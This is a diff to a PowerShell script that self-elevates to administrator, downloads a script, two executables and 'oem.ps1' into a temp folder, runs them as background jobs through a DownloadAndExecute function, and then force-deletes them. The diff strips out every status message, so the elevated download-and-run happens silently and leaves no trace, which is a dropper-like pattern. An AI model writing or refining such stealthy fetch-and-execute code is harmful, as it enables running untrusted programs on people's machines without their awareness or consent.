@@ -1,7 +1,6 @@
 # Function to check if running as admin
 function Ensure-Admin {
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-        Write-Host "Restarting script with administrative privileges..."
         Start-Process powershell.exe "-File $PSCommandPath" -Verb RunAs
         Exit
     }
@@ -25,12 +24,9 @@ function Download-File {
     $attempt = 0
     while ($attempt -lt $retries) {
         try {
-            Write-Host "Attempting to download $url to $output (Attempt $($attempt + 1))"
             Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction Stop
-            Write-Host "Download successful: $url"
             return $true
         } catch {
-            Write-Host "Failed to download $url: $($_.Exception.Message)"
             $attempt++
             if ($attempt -eq $retries) {
                 return $false
@@ -54,7 +50,7 @@ $script2Path = Join-Path -Path $tempDir -ChildPath "oem.ps1"
 # Start background jobs for downloading and executing files
 $jobs = @()
 
-# Define download functions
+# Define download function
 function DownloadAndExecute {
     param (
         [string]$url,
@@ -83,4 +79,4 @@ $jobs | Remove-Job
 # Clean up downloaded files
 Remove-Item $script1Path, $exe1Path, $exe2Path, $script2Path -Force
 
-Write-Host "Script completed. Downloaded files deleted."
+# Script completed
